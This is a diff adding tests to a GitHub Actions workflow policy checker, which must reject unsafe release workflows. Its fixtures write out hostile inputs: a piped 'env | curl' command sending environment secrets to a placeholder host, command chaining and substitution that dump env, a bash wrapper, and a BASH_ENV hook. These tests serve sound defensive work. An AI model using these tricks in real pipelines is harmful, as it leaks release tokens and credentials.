@@ -158,6 +158,22 @@ async function writeWorkflow(
   );
 }
 
+function replaceJobDefinition(
+  source: string,
+  name: "release" | "npm-publish",
+  value: string,
+): string {
+  const pattern = new RegExp(`^  ${name}:\\n(?: {4,}.*\\n)*`, "mu");
+  const replacement = value.startsWith("\n")
+    ? `  ${name}:${value}\n`
+    : `  ${name}: ${value}\n`;
+  const result = source.replace(pattern, replacement);
+  if (result === source) {
+    throw new Error(`Expected ${name} job fixture to be replaced.`);
+  }
+  return result;
+}
+
 describe("GitHub workflow policy", () => {
   it("tests Node 22 and 24 without live mutation credentials", async () => {
     const ci = await readRepositoryFile(workflowPaths[0]);
@@ -270,6 +286,14 @@ describe("GitHub workflow policy", () => {
     {
       name: "mixed-case GitHub token access",
       expression: "${{ GiThUb['ToKeN'] }}",
+    },
+    {
+      name: "the complete GitHub context serialized as JSON",
+      expression: "${{ toJSON(github) }}",
+    },
+    {
+      name: "the bare complete GitHub context",
+      expression: "${{ github }}",
     },
   ])("rejects $name in a non-release workflow", async ({ expression }) => {
     await withPolicyFixture(async (fixtureRoot) => {
@@ -397,6 +421,29 @@ describe("GitHub workflow policy", () => {
   });
 
   it.each([
+    ["release", "null", "null"],
+    ["release", "a scalar", "invalid"],
+    ["release", "a sequence", "\n    - invalid"],
+    ["npm-publish", "null", "null"],
+    ["npm-publish", "a scalar", "invalid"],
+    ["npm-publish", "a sequence", "\n    - invalid"],
+  ] as const)(
+    "rejects the %s job when it is %s",
+    async (jobName, _shape, value) => {
+      await withPolicyFixture(async (fixtureRoot) => {
+        await writeWorkflow(
+          fixtureRoot,
+          "release.yml",
+          replaceJobDefinition(validFutureReleaseWorkflow, jobName, value),
+        );
+
+        const stderr = await verifierFailure(fixtureRoot);
+        expect(stderr).toContain("(RELEASE_JOB_MAPPING)");
+      });
+    },
+  );
+
+  it.each([
     {
       name: "a wrapped GitHub token",
       source: validFutureReleaseWorkflow.replace(
@@ -440,6 +487,106 @@ describe("GitHub workflow policy", () => {
     });
   });
 
+  it.each([
+    {
+      name: "a second shell command",
+      run: "gh release create v1.0.0 package.tgz --verify-tag && env",
+    },
+    {
+      name: "a multiline exfiltration command",
+      run: `|
+          gh release create v1.0.0 package.tgz --verify-tag
+          env | curl --data-binary @- https://example.invalid`,
+    },
+    {
+      name: "a pipe",
+      run: "gh release create v1.0.0 package.tgz --verify-tag | tee release.log",
+    },
+    {
+      name: "a command substitution",
+      run: 'gh release create v1.0.0 package.tgz --notes "$(env)" --verify-tag',
+    },
+  ])("rejects GH_TOKEN beside $name", async ({ run }) => {
+    await withPolicyFixture(async (fixtureRoot) => {
+      await writeWorkflow(
+        fixtureRoot,
+        "release.yml",
+        validFutureReleaseWorkflow.replace(
+          "run: gh release create v1.0.0 package.tgz --verify-tag",
+          `run: ${run}`,
+        ),
+      );
+
+      const stderr = await verifierFailure(fixtureRoot);
+      expect(stderr).toContain("(RELEASE_TOKEN_REFERENCE)");
+    });
+  });
+
+  it.each([
+    {
+      name: "a custom shell wrapper",
+      before: "        run: gh release create v1.0.0 package.tgz --verify-tag",
+      after:
+        "        shell: bash -c 'env; {0}'\n        run: gh release create v1.0.0 package.tgz --verify-tag",
+    },
+    {
+      name: "a shell startup environment hook",
+      before: "          GH_TOKEN: ${{ github.token }}",
+      after:
+        "          GH_TOKEN: ${{ github.token }}\n          BASH_ENV: ./release-wrapper.sh",
+    },
+  ])("rejects GH_TOKEN with $name", async ({ before, after }) => {
+    await withPolicyFixture(async (fixtureRoot) => {
+      await writeWorkflow(
+        fixtureRoot,
+        "release.yml",
+        validFutureReleaseWorkflow.replace(before, after),
+      );
+
+      const stderr = await verifierFailure(fixtureRoot);
+      expect(stderr).toContain("(RELEASE_TOKEN_REFERENCE)");
+    });
+  });
+
+  it.each([
+    {
+      name: "a missing checkout step",
+      before: `      - name: Check out source
+        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
+        with:
+          persist-credentials: false
+`,
+      after: "",
+      code: "RELEASE_CHECKOUT_REQUIRED",
+    },
+    {
+      name: "missing persist-credentials",
+      before: `        with:
+          persist-credentials: false
+`,
+      after: "",
+      code: "CHECKOUT_CREDENTIAL_PERSISTENCE",
+    },
+    {
+      name: "persist-credentials enabled",
+      before: "          persist-credentials: false",
+      after: "          persist-credentials: true",
+      code: "CHECKOUT_CREDENTIAL_PERSISTENCE",
+    },
+  ])("rejects release checkout with $name", async (fixture) => {
+    await withPolicyFixture(async (fixtureRoot) => {
+      expect(validFutureReleaseWorkflow).toContain(fixture.before);
+      await writeWorkflow(
+        fixtureRoot,
+        "release.yml",
+        validFutureReleaseWorkflow.replace(fixture.before, fixture.after),
+      );
+
+      const stderr = await verifierFailure(fixtureRoot);
+      expect(stderr).toContain(`(${fixture.code})`);
+    });
+  });
+
   it("accepts the future Task 7 manually gated release workflow", async () => {
     await withPolicyFixture(async (fixtureRoot) => {
       await writeWorkflow(
@@ -453,6 +600,51 @@ describe("GitHub workflow policy", () => {
       expect(result.stdout).toBe(
         "Workflow policy check passed: 4 workflows and 2 dependency ecosystems.\n",
       );
+    });
+  });
+
+  it.each([
+    {
+      name: "an include entry",
+      addition: `
+        include:
+          - os: ubuntu-latest
+            node-version: 22
+            experimental: true`,
+    },
+    {
+      name: "a self-hosted include entry",
+      addition: `
+        include:
+          - os: self-hosted
+            node-version: 22`,
+    },
+    {
+      name: "an exclude entry",
+      addition: `
+        exclude:
+          - os: windows-latest
+            node-version: 24`,
+    },
+    {
+      name: "an extra architecture dimension",
+      addition: `
+        architecture: [x64]`,
+    },
+  ])("rejects a package matrix with $name", async ({ addition }) => {
+    await withPolicyFixture(async (fixtureRoot) => {
+      const target = resolve(fixtureRoot, workflowPaths[1]);
+      const source = await readFile(target, "utf8");
+      const marker = "        node-version: [22, 24]";
+      expect(source).toContain(marker);
+      await writeFile(
+        target,
+        source.replace(marker, `${marker}${addition}`),
+        "utf8",
+      );
+
+      const stderr = await verifierFailure(fixtureRoot);
+      expect(stderr).toContain("(PACKAGE_MATRIX_SHAPE)");
     });
   });
 
